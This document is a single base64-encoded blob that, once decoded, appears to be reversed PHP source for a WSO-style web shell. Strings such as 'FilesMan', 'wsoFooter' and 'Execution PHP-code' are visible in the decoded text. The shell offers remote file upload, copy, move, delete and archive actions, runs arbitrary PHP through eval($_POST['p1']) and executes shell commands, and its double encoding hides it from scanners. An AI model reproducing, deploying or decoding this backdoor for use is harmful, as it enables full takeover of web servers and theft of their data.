FNPUF8kKHl0cG1lKGZpICAgIAp9CQo7dGl4ZQkJCjtwbWV0JCAsIm5cIiAsKXBtZXQkKG5lbHJ0cyBvaGNlCQkKOyJuXDsnIi4pIjBcJ1xcdFxyXG5cIiwpKShuYWVsY190ZWdfYm8oc3JhaGNsYWljZXBzbG10aChzZWhzYWxzY2RkYS4iJz1MTVRIcmVubmkuKSd0dXB0dU9ydHMnKGRJeUJ0bmVtZWxFdGVnLnRuZW11Y29kOycnPXlhbHBzaWQuZWx5dHMuKSd0dXB0dU9ydHMnKGRJeUJ0bmVtZWxFdGVnLnRuZW11Y29kIiA9IHBtZXQkCQkKOyldJzJwJ1tUU09QXyQoXScxcCdbVFNPUF8kIG9oY2UJCQkKKSlzbG9vVGduaXJ0cyQgLF0nMXAnW1RTT1BfJCh5YXJyYV9uaShmaQkJCjspKHRyYXRzX2JvCQkKOylldXJ0ICwneGFqYScuKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG0oZWlrb29jdGVzT1NXCQkKeyApKV0neGFqYSdbVFNPUF8kKHRlc3NpKGZpCQo7KQkKLCduZWxydHMnID49ICdodGduZWwgZ25pcnRTJwkJCiwnc3JhaGNsYWljZXBzbG10aCcgPj0gJ3NyYWhjbGFpY2Vwc2xtdEgnCQkKLCdyZXBwdW90cnRzJyA+PSAnZXNhYyByZXBwdSBvdCBnbmlydFMnCQkKLCdyZXdvbG90cnRzJyA+PSAnZXNhYyByZXdvbCBvdCBnbmlydFMnCQkKLCdjZWRuaWInID49ICdDRUQgb3QgTklCJwkJCiwneGVobmliJyA+PSAnWEVIIG90IE5JQicJCQosJ25pYmNlZCcgPj0gJ05JQiBvdCBDRUQnCQkKLCd4ZWhjZWQnID49ICdYRUggb3QgQ0VEJwkJCiwnbmliMnhlaCcgPj0gJ05JQiBvdCBYRUgnCQkKLCdjZWR4ZWgnID49ICdDRUQgb3QgWEVIJwkJCiwnaWljc2EyeGVoJyA+PSAnSUlDU0Egb3QgWEVIJwkJCiwneGVoMmlpY3NhJyA+PSAnWEVIIG90IElJQ1NBJwkJCiwnMjNjcmMnID49ICcyM0NSQycJCQosJ3RweXJjJyA+PSAndHB5cmMnCQkKLCcxYWhzJyA+PSAnaHNhaCAxYWhzJwkJCiwnNWRtJyA+PSAnaHNhaCA1ZG0nCQkKLCdlZG9jbmVscnVfbGx1ZicgPj0gJ2Vkb2NuZWxydSBsbHVGJwkJCiwnZWRvY2VkbHJ1JyA+PSAnZWRvY2VkIGxyVScJCQosJ2Vkb2NuZWxydScgPj0gJ2Vkb2NuZSBsclUnCQkKLCdlZG9jZWRfNDZlc2FiJyA+PSAnZWRvY2VkIDQ2ZXNhQicJCQosJ2Vkb2NuZV80NmVzYWInID49ICdlZG9jbmUgNDZlc2FCJwkJCih5YXJyYSA9IHNsb29UZ25pcnRzJAkKfX07KXIkKHJlcHB1b3RydHMgbnJ1dGVyOykpXWkkW3AkKGRybyh4ZWhjZWQuJyUnID0uciQpaSQrKzspcCQobmVscnRzPGkkOzA9aSQocm9mOycnPXIkeylwJChlZG9jbmVscnVfbGx1ZiBub2l0Y251ZnsgKSknZWRvY25lbHJ1X2xsdWYnKHN0c2l4ZV9ub2l0Y251ZiEoZmkJCn19OylyJChyZXBwdW90cnRzIG5ydXRlcjspKV1pJFtwJChkcm8sJ1gyMCUnKGZ0bmlycHMgPS5yJClpJCsrOylwJChuZWxydHM8aSQ7MD1pJChyb2Y7Jyc9ciR7KXAkKHhlaDJpaWNzYSBub2l0Y251ZnsgKSkneGVoMmlpY3NhJyhzdHNpeGVfbm9pdGNudWYhKGZpCQp9fTtyJCBucnV0ZXJ9OykpXTEraSRbcCQuXWkkW3AkKGNlZHhlaChyaGM9LnIkeykyPStpJDspcCQobmVMcnRzPGkkOzA9aSQocm9mOycnPXIkeylwJChpaWNzYTJ4ZWggbm9pdGNudWZ7ICkpJ2lpY3NhMnhlaCcoc3RzaXhlX25vaXRjbnVmIShmaQkKfX07KSlwJChjZWRuaWIoeGVoY2VkIG5ydXRlcnsgKXAkKHhlaG5pYiBub2l0Y251ZnsgKSkneGVobmliJyhzdHNpeGVfbm9pdGNudWYhKGZpICAgIAp9fTspKXAkKGNlZHhlaChuaWJjZWQgbnJ1dGVyeyApcCQobmliMnhlaCBub2l0Y251ZnsgKSknbmliMnhlaCcoc3RzaXhlX25vaXRjbnVmIShmaQkKeyApKHNsb29UZ25pcnRTbm9pdGNhIG5vaXRjbnVmCgp9CjspKHJldG9vRm9zdwkKOyI+dmlkLzw+ZWxiYXQvPD5tcm9mLzw+cnQvPD5kdC88Pic+Pic9ZXVsYXYgJ3RpbWJ1cyc9ZXB5dCB0dXBuaTwiIG9oY2UgICAgCjsiO3BzYm4mPiciIC4gKSd6Zy5yYXQnOidwaXonPydwaXonID09IF0ndGNhJ1tFSUtPT0NfJCggLiAiLiIgLiApInNpSF9kbVkiKGV0YWQgLiAiX29zdyc9ZXVsYXYgMnA9ZW1hbiB0eGV0PWVweXQgdHVwbmk8IDplbWFuIGVsaWYiIG9oY2UgICAgICAgIAopKSkncmF0JyA9PSBdJ3RjYSdbRUlLT09DXyQoIHx8ICkncGl6JyA9PSBdJ3RjYSdbRUlLT09DXyQoKCAmJiApXSdmJ1tFSUtPT0NfJCh0bnVvY0AgJiYgKV0ndGNhJ1tFSUtPT0NfJCh5dHBtZSEgJiYgKSJjcGdfc2V0b3VxX2NpZ2FtX3RlZyIoc3RzaXhlX25vaXRjbnVmKGZpICAgIAo7Ijtwc2JuJj50Y2VsZXMvPCIgb2hjZSAgICAKOyI+bm9pdHBvLzxzc2VycG1vQyAvIGV0c2FQPidldHNhcCc9ZXVsYXYgbm9pdHBvPCIgb2hjZSAgICAgICAgCikpXSdmJ1tFSUtPT0NfJCh0bnVvY0AgJiYgKV0ndGNhJ1tFSUtPT0NfJCh5dHBtZSEgJiYgKSJjcGdfc2V0b3VxX2NpZ2FtX3RlZyIoc3RzaXhlX25vaXRjbnVmKGZpICAgIAo7Ij5ub2l0cG8vPCl6Zy5yYXQoIHNzZXJwbW9DPidyYXQnPWV1bGF2IG5vaXRwbzwiIG9oY2UgICAgCjsiPm5vaXRwby88KXBpeiggc3NlcnBtb2NuVT4ncGl6bnUnPWV1bGF2IG5vaXRwbzw+bm9pdHBvLzwpcGl6KCBzc2VycG1vQz4ncGl6Jz1ldWxhdiBub2l0cG88IiBvaGNlICAgICAgICAKKSknZXZpaGNyQXBpWicoc3RzaXhlX3NzYWxjKGZpICAgIAo7Ij5ub2l0cG8vPGV0ZWxlRD4nZXRlbGVkJz1ldWxhdiBub2l0cG88Pm5vaXRwby88ZXZvTT4nZXZvbSc9ZXVsYXYgbm9pdHBvPD5ub2l0cG8vPHlwb0M+J3lwb2MnPWV1bGF2IG5vaXRwbzw+JzFwJz1lbWFuIHRjZWxlczwJCj4nIi4pJyc6XSd0ZXNyYWhjJ1tUU09QXyQ/KV0ndGVzcmFoYydbVFNPUF8kKHRlc3NpKCAuIic9ZXVsYXYgdGVzcmFoYz1lbWFuIG5lZGRpaD1lcHl0IHR1cG5pPAkKPiciLiApXSdkd2MnW1NMQUJPTEckKHNyYWhjbGFpY2Vwc2xtdGggLiAiJz1ldWxhdiBjPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8CQo+J25hTXNlbGlGJz1ldWxhdiBhPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8CQo+Nz1uYXBzbG9jIGR0PD5ydDwiIG9oY2UJCn0JCjsxOjA/bCQgPSBsJAkJCjsnPnJ0Lzw+ZHQvPCcuKScnOic+YS88RD4iKSdcZGFvbG53b2QnXCAsJ1wnLildJ2VtYW4nW2YkKGVkb2NuZWxydS4nJ1wsbGx1biwnXHNsb29Uc2VsaUYnXChnIj1rY2lsY25vICIjIj1mZXJoIGE8ID5hLzxFPiIpJ1x0aWRlJ1wgLCdcJy4pXSdlbWFuJ1tmJChlZG9jbmVscnUuJydcLGxsdW4sJ1xzbG9vVHNlbGlGJ1woZyI9a2NpbGNubyAiIyI9ZmVyaCBhPCAnPyknZWxpZic9PV0nZXB5dCdbZiQoKC4nPmEvPFQ+IiknXGhjdW90J1wgLCdcJy4pXSdlbWFuJ1tmJChlZG9jbmVscnUuJydcLGxsdW4sJ1xzbG9vVHNlbGlGJ1woZyI9a2NpbGNubyAiIyI9ZmVyaCBhPCA+YS88Uj4iKSdcZW1hbmVyJ1wgLCdcJy4pXSdlbWFuJ1tmJChlZG9jbmVscnUuJydcLGxsdW4sJ1xzbG9vVHNlbGlGJ1woZyI9a2NpbGNubyAiIyI9ZmVyaCBhPD5kdDw+ZHQvPCcuCQkJCl0nc21yZXAnW2YkLic+IiknXGRvbWhjJ1wsJ1wnLildJ2VtYW4nW2YkKGVkb2NuZWxydS4nJ1wsbGx1biwnXHNsb29Uc2VsaUYnXChnIj1rY2lsY25vICM9ZmVyaCBhPD5kdDw+ZHQvPCcuXSdwdW9yZydbZiQuJy8nLl0ncmVud28nW2YkLic+ZHQ8PmR0LzwnLl0neWZpZG9tJ1tmJC4nPmR0PD5kdC88Jy4pXSdlcHl0J1tmJDopXSdlemlzJ1tmJChlemlTd2VpVm9zdz8pJ2VsaWYnPT1dJ2VweXQnW2YkKCguJz5kdDw+ZHQvPD5hLzwnLiknPmIvPF0gJyAuICldJ2VtYW4nW2YkKHNyYWhjbGFpY2Vwc2xtdGggLiAnIFs+Yjw+JyAuICkiJ31dJ2tuaWwnW2Ykeyc9ZWx0aXQiIDogJycgPyApXSdrbmlsJ1tmJCggeXRwbWUoIC4gJyAiOyknXCcuXSdodGFwJ1tmJC4nJ1wsJ1xuYU1zZWxpRidcKGcnOildJ2VtYW4nW2YkKHNyYWhjbGFpY2Vwc2xtdGguJz4iKSdcd2VpdidcICwnXCcuKV0nZW1hbidbZiQoZWRvY25lbHJ1LicnXCxsbHVuLCdcc2xvb1RzZWxpRidcKGcnPyknZWxpZic9PV0nZXB5dCdbZiQoKC4nIj1rY2lsY25vICM9ZmVyaCBhPD5kdDw+ZHQvPD54YmtoYz1zc2FsYyAiJy4pXSdlbWFuJ1tmJChlZG9jbmVscnUuJyI9ZXVsYXYgIl1bZiI9ZW1hbiB4b2JrY2VoYz1lcHl0IHR1cG5pPD5kdDw+Jy4pJyc6JzFsPXNzYWxjICc/bCQoLidydDwnIG9oY2UJCQp7IClmJCBzYSBzZWxpZiQoaGNhZXJvZgkKOzAgPSBsJAkKOylzZWxpZiQgLHNyaWQkKGVncmVtX3lhcnJhID0gc2VsaWYkCQo7KSJwbUNvc3ciICxzcmlkJCh0cm9zdQkKOykicG1Db3N3IiAsc2VsaWYkKHRyb3N1CQp9CQo7KTEtOjE/XTFbXSd0cm9zJ1tTTEFCT0xHJCgqKTEgOiAxLSA/ICldJ2V6aXMnW2IkIDwgXSdlemlzJ1thJCgoIG5ydXRlcgkJCQplc2xlCQkKOykxLToxP10xW10ndHJvcydbU0xBQk9MRyQoKikpXV0wW10ndHJvcydbU0xBQk9MRyRbYiQocmV3b2xvdHJ0cyAsKV1dMFtdJ3Ryb3MnW1NMQUJPTEckW2EkKHJld29sb3RydHMocG1jcnRzIG5ydXRlcgkJCQopJ2V6aXMnID0hIF0wW10ndHJvcydbU0xBQk9MRyQoZmkJCQp7ICliJCAsYSQocG1Db3N3IG5vaXRjbnVmCQo7dHJvcyQgPSBdJ3Ryb3MnW1NMQUJPTEckCQoJCn0JCjspKSdyaWQnID49ICdlcHl0Jyh5YXJyYSAscG10JChlZ3JlbV95YXJyYSA9IF1bc3JpZCQJCQkKKSldaSRbdG5ldG5vQ3JpZCQgLiBdJ2R3YydbU0xBQk9MRyQocmlkX3NpQChmaWVzbGUJCQo7KSkpXSdodGFwJ1twbXQkKGtuaWxkYWVyID49ICdrbmlsJyAsJ2tuaWwnID49ICdlcHl0Jyh5YXJyYSAscG10JChlZ3JlbV95YXJyYSA9IF1bc3JpZCQJCQkKKSldaSRbdG5ldG5vQ3JpZCQgLiBdJ2R3YydbU0xBQk9MRyQoa25pbF9zaUAoZmllc2xlCQkKOykpJ2VsaWYnID49ICdlcHl0Jyh5YXJyYSAscG10JChlZ3JlbV95YXJyYSA9IF1bc2VsaWYkCQkJCikpXWkkW3RuZXRub0NyaWQkIC4gXSdkd2MnW1NMQUJPTEckKGVsaWZfc2lAKGZpCQkKOykJCQkJCQopXWkkW3RuZXRub0NyaWQkKHB1b3JnZWxpZkA6XSdlbWFuJ1tyZyQ/XSdlbWFuJ1tyZyQgPj0gJ3B1b3JnJyAJCQkJCQosKV1pJFt0bmV0bm9DcmlkJChyZW53b2VsaWZAOl0nZW1hbidbd28kP10nZW1hbidbd28kID49ICdyZW53bycgCQkJCQkKLCldaSRbdG5ldG5vQ3JpZCQuXSdkd2MnW1NMQUJPTEckKGV6aXNlbGlmQCA+PSAnZXppcycgCQkJCQkKLCldaSRbdG5ldG5vQ3JpZCQgLiBdJ2R3YydbU0xBQk9MRyQocm9sb0NzbXJlUG9zdyA+PSAnc21yZXAnIAkJCQkJCiwpKV1pJFt0bmV0bm9DcmlkJCAuIF0nZHdjJ1tTTEFCT0xHJChlbWl0bWVsaWZAICwnczppOkggZC1tLVknKGV0YWQgPj0gJ3lmaWRvbScgCQkJCQkKLF1pJFt0bmV0bm9DcmlkJC5dJ2R3YydbU0xBQk9MRyQgPj0gJ2h0YXAnIAkJCQkJCixdaSRbdG5ldG5vQ3JpZCQgPj0gJ2VtYW4nKHlhcnJhID0gcG10JAkJCjspKV1pJFt0bmV0bm9DcmlkJChwdW9yZ2VsaWZAKGRpZ3JndGVnX3hpc29wQCA9IHJnJAkJCn0JCQo7JycgPSB3byQJCQkKe2VzbGV9CQkKOykpXWkkW3RuZXRub0NyaWQkKHJlbndvZWxpZkAoZGl1d3B0ZWdfeGlzb3BAID0gd28kCQkJCnspKSdkaXV3cHRlZ194aXNvcCcoc3RzaXhlX25vaXRjbnVmKGZpCQkKeyApKytpJDtuJDxpJDswPWkkKHJvZgkKOyl0bmV0bm9DcmlkJCh0bnVvYyA9IG4kCQo7KSh5YXJyYSA9IHNlbGlmJCA9IHNyaWQkCQo7Ij5ydC88Pmh0Lzxzbm9pdGNBPmh0PD5odC88PmEvPHNub2lzc2ltcmVQPicpIlwiLikxOjA/XTFbdHJvcyQoLiJfc21yZXBfcyJcLGxsdW4sIlxuYU1zZWxpRiJcKGcnPWtjaWxjbm8gJyMnPWZlcmggYTw+aHQ8Pmh0LzxwdW9yRy9yZW53Tz5odDw+aHQvPD5hLzx5Zmlkb00+JykiXCIuKTE6MD9dMVt0cm9zJCguIl95Zmlkb21fcyJcLGxsdW4sIlxuYU1zZWxpRiJcKGcnPWtjaWxjbm8gJyMnPWZlcmggYTw+aHQ8Pmh0Lzw+YS88ZXppUz4nKSJcIi4pMTowP10xW3Ryb3MkKC4iX2V6aXNfcyJcLGxsdW4sIlxuYU1zZWxpRiJcKGcnPWtjaWxjbm8gJyMnPWZlcmggYTw+aHQ8Pmh0Lzw+YS88ZW1hTj4nKSJcIi4pMTowP10xW3Ryb3MkKC4iX2VtYW5fcyJcLGxsdW4sIlxuYU1zZWxpRiJcKGcnPWtjaWxjbm8gJyMnPWZlcmggYTw+aHQ8Pmh0Lzw+eGJraGM9c3NhbGMgJykoYXMnPWtjaWxjbm8geG9ia2NlaGM9ZXB5dCB0dXBuaTw+J3hwMzEnPWh0ZGl3IGh0PD5ydDw+dHNvcD1kb2h0ZW0gc2VsaWY9ZW1hbiBtcm9mPAo+JzInPWduaWRkYXBsbGVjICcwJz1nbmljYXBzbGxlYyAnbmlhbSc9c3NhbGMgJyUwMDEnPWh0ZGl3IGVsYmF0PAo+dHBpcmNzLzwKfQkKO2Rla2NlaGMuXTBbc3RuZW1lbGUuc2VsaWYuZCA9IGRla2NlaGMuXWlbc3RuZW1lbGUuc2VsaWYuZAkJCQkKKSd4b2JrY2VoYycgPT0gZXB5dC5daVtzdG5lbWVsZS5zZWxpZi5kKGZpCQkJCikrK2k7aHRnbmVsLnN0bmVtZWxlLnNlbGlmLmQ8aTswPWkocm9mCQkKeyApKGFzIG5vaXRjbnVmCQo+dHBpcmNzPCIgb2hjZQp9CQo7KV0yW2hjdGFtJCl0bmkoICxdMVtoY3RhbSQoeWFycmEgPSB0cm9zJAkJCQopKWhjdGFtJCAsXScxcCdbVFNPUF8kICwnISl9MXtkXChfKStdei1BWyhfcyEnKGhjdGFtX2dlcnAoZmkJCQp7ICkpXScxcCdbVFNPUF8kKHl0cG1lIShmaQkKOykxICwnZW1hbicoeWFycmEgPSB0cm9zJAkKO3Ryb3MkIGxhYm9sZwkKfSA7bnJ1dGVyIDspKHJldG9vRm9zdzsnIXJlZGxvZiBzaWh0IG5lcG8gdCdcbmFDJyBvaGNlCXsgKWVzbGFmID09PSB0bmV0bm9DcmlkJChmaQkKOyldJ2R3YydbU0xBQk9MRyQ6XSdjJ1tUU09QXyQ/KV0nYydbVFNPUF8kKHRlc3NpKHJpZG5hY1Nvc3cgPSB0bmV0bm9DcmlkJAkKOyc+dHBpcmNzLzw7IiI9XzNwPV8ycD1fMXA+dHBpcmNzPD50bmV0bm9jPXNzYWxjIHZpZDw+MWgvPHJlZ2FuYW0gZWxpRj4xaDwnIG9oY2UJCjspKHJlZGFlSG9zdyAgICAKfQkKfQkJCjtrYWVyYgkJCQkKfQkJCQkKOyldJ2MnW1RTT1BfJEAgLCdjJyhlaWtvb2N0ZXNPU1cJCQkJCQo7KSldJ2YnW1RTT1BfJEAoZXppbGFpcmVzICwnZicoZWlrb29jdGVzT1NXCQkJCQkKOyldJzFwJ1tUU09QXyQgLCd0Y2EnKGVpa29vY3Rlc09TVwkJCQkJCnsgKSldJzFwJ1tUU09QXyQoeXRwbWUhKGZpICAgICAgICAgICAgICAgIAo6dGx1YWZlZAkJCQo7a2FlcmIJCQkJCjspMDA2MyAtICkoZW1pdCAsJycgLCdmJyhlaWtvb2N0ZXMgICAgICAgICAgICAgICAgCjspXSdmJ1tFSUtPT0NfJCh0ZXNudQkJCQkKfQkJCQkKOyldJ2R3YydbU0xBQk9MRyQocmlkaGMgICAgICAgICAgICAgICAgICAgIAo7KSldJ2YnW0VJS09PQ18kICwnICcoZWRvbHBtaSAuICcgJyAuICldJzJwJ1tUU09QXyQoZ3JhbGxlaHNlcGFjc2UgLiAnIHZ6ZmMgcmF0Jyh4RW9zdyAgICAgICAgICAgICAgICAgICAgCjspXSdmJ1tFSUtPT0NfJCAsJ2dyYWxsZWhzZXBhY3NlJyhwYW1feWFycmEgPSBdJ2YnW0VJS09PQ18kICAgICAgICAgICAgICAgICAgICAKOyldJ2MnW0VJS09PQ18kKHJpZGhjICAgICAgICAgICAgICAgICAgICAKeyApJ3JhdCcgPT0gXSd0Y2EnW0VJS09PQ18kKGZpZXNsZSB9CQkJCQp9ICAgICAgICAgICAgICAgICAgICAKfSAgICAgICAgICAgICAgICAgICAgICAgIAp9ICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo7KShlc29sYz4tcGl6JCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjspXSdkd2MnW1NMQUJPTEckKG9UdGNhcnR4ZT4tcGl6JCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnsgKSlmJC5dJ2MnW0VJS09PQ18kKG5lcG8+LXBpeiQoZmkgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnsgKWYkIHNhIF0nZidbRUlLT09DXyQoaGNhZXJvZiAgICAgICAgICAgICAgICAgICAgICAgIAo7KShldmloY3JBcGlaIHdlbiA9IHBpeiQgICAgICAgICAgICAgICAgICAgICAgICAKeyApKSdldmloY3JBcGlaJyhzdHNpeGVfc3NhbGMoZmkJCQkJCQp7ICkncGl6bnUnID09IF0ndGNhJ1tFSUtPT0NfJChmaWVzbGUgfQkJCQkKfSAgICAgICAgICAgICAgICAgICAgCn0gICAgICAgICAgICAgICAgICAgICAgICAKOykoZXNvbGM+LXBpeiQgICAgICAgICAgICAgICAgICAgICAgICAgICAgCjspXSdkd2MnW1NMQUJPTEckKHJpZGhjICAgICAgICAgICAgICAgICAgICAgICAgICAgIAp9ICAgICAgICAgICAgICAgICAgICAgICAgICAgIAp9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo7KXllayQgLCl5ZWskKGh0YXBsYWVyKGVsaUZkZGE+LXBpeiQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnsgKWV1bGF2JD49eWVrJCBzYSByb3RhcmV0aSQoIGhjYWVyb2YgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKOykpU1RPRF9QSUtTOjpyb3RhcmV0SW1ldHN5c2VsaUYgLCcvJy5mJChyb3RhcmV0SXlyb3RjZXJpRGV2aXNydWNlUiB3ZW4ocm90YXJldElyb3RhcmV0SWV2aXNydWNlUiB3ZW4gPSByb3RhcmV0aSQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKeyApKWYkLl0nYydbRUlLT09DXyQocmlkX3NpQChmaWVzbGUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo7KWYkICxmJC5dJ2MnW0VJS09PQ18kKGVsaUZkZGE+LXBpeiQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKKSlmJC5dJ2MnW0VJS09PQ18kKGVsaWZfc2lAKGZpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKO2V1bml0bm9jICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiknLi4nID09IGYkKGZpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKeyApZiQgc2EgXSdmJ1tFSUtPT0NfJChoY2Flcm9mICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo7KV0nYydbRUlLT09DXyQocmlkaGMgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnsgKSkxICxdJzJwJ1tUU09QXyQobmVwbz4tcGl6JCggZmkgICAgICAgICAgICAgICAgICAgICAgICAKOykoZXZpaGNyQXBpWiB3ZW4gPSBwaXokICAgICAgICAgICAgICAgICAgICAgICAgCnsgKSknZXZpaGNyQXBpWicoc3RzaXhlX3NzYWxjKGZpCQkJCQkKeyApJ3BpeicgPT0gXSd0Y2EnW0VJS09PQ18kKGZpZXNsZSB9CQkJCQo7KWYkLl0nZHdjJ1tTTEFCT0xHJCAsZiQuXSdjJ1tFSUtPT0NfJChlbWFuZXJACQkJCQkJCilmJCBzYSBdJ2YnW0VJS09PQ18kKGhjYWVyb2YJCQkJCQp9CQkJCQkKOylzJC5kJCAscyQuYyQoeXBvY0AJCQkJCQkJCikpcyQuYyQoZWxpZl9zaUAoZmllc2xlIH0JCQkJCQkKOyknLycucyQuZCQgLGYkLCcvJy5zJC5jJChldHNhcF95cG9jCQkJCQkJCQkJCikpIi4uIiA9ISBmJCggZG5hICkiLiIgPSEgZiQoKCBmaQkJCQkJCQkJCillc2xhZiA9PSEgKSloJChyaWRkYWVyQCA9IGYkKCggZWxpaHcJCQkJCQkJCjspcyQuYyQocmlkbmVwb0AgPSBoJAkJCQkJCQkKOylzJC5kJChyaWRrbQkJCQkJCQkKeykpcyQuYyQocmlkX3NpKGZpCQkJCQkJCnspZCQscyQsYyQoZXRzYXBfZXZvbSBub2l0Y251ZgkJCQkJCnsgKSdldm9tJyA9PSBdJ3RjYSdbRUlLT09DXyQoZmllc2xlIH0JCQkJCjspXSdkd2MnW1NMQUJPTEckICxmJCxdJ2MnW0VJS09PQ18kKGV0c2FwX3lwb2MJCQkJCQkKKWYkIHNhIF0nZidbRUlLT09DXyQoaGNhZXJvZgkJCQkJCn0JCQkJCQo7KXMkLmQkICxzJC5jJCh5cG9jQAkJCQkJCQkKKSlzJC5jJChlbGlmX3NpKGZpZXNsZSB9CQkJCQkJCjspJy8nLnMkLmQkICxmJCwnLycucyQuYyQoZXRzYXBfeXBvYwkJCQkJCQkJCQopKSIuLiIgPSEgZiQoIGRuYSApIi4iID0hIGYkKCggZmkJCQkJCQkJCQopZXNsYWYgPT0hICkpaCQocmlkZGFlckAgPSBmJCgoIGVsaWh3CQkJCQkJCQo7KXMkLmMkKHJpZG5lcG9AID0gaCQJCQkJCQkJCjspcyQuZCQocmlka20JCQkJCQkJCnspKXMkLmMkKHJpZF9zaShmaQkJCQkJCQp7KWQkLHMkLGMkKGV0c2FwX3lwb2Mgbm9pdGNudWYJCQkJCQp7ICkneXBvYycgPT0gXSd0Y2EnW0VJS09PQ18kKGZpCQkJCQo6J2V0c2FwJyBlc2FjCQkJCjtrYWVyYgkJCQkKfQkJCQkJCjspZiQoa25pbG51QAkJCQkJCQkKZXNsZQkJCQkJCQo7KWYkKHJpRGV0ZWxlZAkJCQkJCQkKKSlmJChyaWRfc2koZmkJCQkJCQkKOylmJChlZG9jZWRscnUgPSBmJAkJCQkJCQo7ZXVuaXRub2MgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiknLi4nID09IGYkKGZpICAgICAgICAgICAgICAgICAgICAgICAgCnsgKWYkIHNhIF0nZidbVFNPUF8kKGhjYWVyb2YJCQkJCQopKV0nZidbVFNPUF8kQCh5YXJyYV9zaShmaQkJCQkKfQkJCQkKOylodGFwJChyaWRtckAJCQkJCQo7KWhkJChyaWRlc29sYwkJCQkJCn0JCQkJCQo7KW1ldGkkKGtuaWxudUAJCQkJCQkJCmVzbGUJCQkJCQkKOyltZXRpJChyaURldGVsZWQJCQkJCQkJCikicmlkIiA9PSBlcHl0JCggZmkJCQkJCQkKOyltZXRpJChlcHl0ZWxpZiA9IGVweXQkCQkJCQkJCjtldW5pdG5vYwkJCQkJCQkKKSApIi4iID09ICltZXRpJChlbWFuZXNhYiggfHwgKSIuLiIgPT0gKW1ldGkkKGVtYW5lc2FiKCAoIGZpCQkJCQkJCjttZXRpJC5odGFwJCA9IG1ldGkkCQkJCQkJCnsgKWVzbGFmID09ISApICloZCQocmlkZGFlciA9IG1ldGkkKCAoIGVsaWh3CQkJCQkKOylodGFwJChyaWRuZXBvID0gIGhkJAkJCQkJCjsnLycuaHRhcCQ6aHRhcCQgPyApJy8nPT0pMS0saHRhcCQocnRzYnVzKCA9IGh0YXAkCQkJCQkKeyApaHRhcCQocmlEZXRlbGVkIG5vaXRjbnVmCQkJCQo6J2V0ZWxlZCcgZXNhYwkJCQo7a2FlcmIJCQkJCjsicmlkIHdlbiBldGFlcmMgdCduYUMiIG9oY2UJCQkJCQopKV0nMnAnW1RTT1BfJChyaWRrbUAhKGZpCQkJCQo6J3JpZGttJyBlc2FjCQkJCjtrYWVyYgkJCQkKOyIhZWxpZiBkYW9scHUgdCduYUMiIG9oY2UJCQkJCQopKV0nZW1hbidbXSdmJ1tTRUxJRl8kICxdJ2VtYW5fcG10J1tdJ2YnW1NFTElGXyQoZWxpZl9kZWRhb2xwdV9ldm9tQCEoZmkJCQkJCjonZWxpRmRhb2xwdScgZXNhYwkJCQp7ICldJzFwJ1tUU09QXyQoaGN0aXdzCQkKeyApKV0nMXAnW1RTT1BfJCh5dHBtZSEoZmkJCiAgICAKOyldJ2YnW0VJS09PQ18kKGV6aWxhaXJlc251QCA9IF0nZidbRUlLT09DXyQgICAgICAgIAopKV0nZidbRUlLT09DXyQoIHl0cG1lISggZmkgICAgCnsgKShuYU1zZWxpRm5vaXRjYSBub2l0Y251ZgoKfQo7KShyZXRvb0Zvc3cJCjsnPnZpZC88PmVycC88JyBvaGNlCQp9CQo7KSkobmFlbGNfdGVnX2JvKHNyYWhjbGFpY2Vwc2xtdGggb2hjZQkJCjspXScxcCdbVFNPUF8kKGxhdmUJCQo7KSh0cmF0c19ibwkJCnsgKSldJzFwJ1tUU09QXyQoeXRwbWUhKGZpCQo7Jz4xbG09c3NhbGMgIjt4cDU6cG90LW5pZ3JhbScuKScnOic7ZW5vbjp5YWxwc2lkJz8pXScxcCdbVFNPUF8kKHl0cG1lKC4nIj1lbHl0cyB0dXB0dU9waFA9ZGkgZXJwPD5tcm9mLzxYQUpBIGduaXN1IGRuZXMgPicuKScnOidkZWtjZWhjJz9dJ3hhamEnLildJ1RTT0hfUFRUSCdbUkVWUkVTXyQoNWRtW0VJS09PQ18kKC4nIDE9ZXVsYXYgeGFqYT1lbWFuIHhvYmtjZWhjPWVweXQgdHVwbmk8ICcgb2hjZQkKOyc+InhwNTpwb3QtbmlncmFtIj1lbHl0cyBsYXZFPWV1bGF2IHRpbWJ1cz1lcHl0IHR1cG5pPD5hZXJhdHhldC88Jy4pJyc6KV0nMXAnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoPyldJzFwJ1tUU09QXyQoeXRwbWUhKC4nPmVkb0NwaFA9ZGkgYWVyYWdpYj1zc2FsYyBlZG9jPWVtYW4gYWVyYXR4ZXQ8PiI7ZXNsYWYgbnJ1dGVyfTspJ1wnXCxldWxhdi5lZG9jLnNpaHQsbGx1biwnXHBoUCdcKGd7ZXNsZX07KWV1bGF2LmVkb2Muc2lodCxsbHVuLCdccGhQJ1woYXspZGVrY2VoYy54YWphLnNpaHQoZmkiPXRpbWJ1c25vIHRzb3A9ZG9odGVtIGZwPWVtYW4gbXJvZjw+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzxlZG9jLVBIUCBub2l0dWNleEU+MWg8JyBvaGNlICAgIAp9CQo7Jz5yYjw+dmlkLzwnLiApcG10JCAsJzJoPCcsJzFoPCcoZWNhbHBlcl9ydHMgb2hjZQkJCjspcG10JCAsKSAgICAgICAgCicnICAgICAgICAgICAgCiwnfTEkeyBodCBoLiAsaC4gLHYuICxlLicgICAgICAgICAgICAKLCcnICAgICAgICAgICAgCiggeWFycmEgLCkgICAgICAg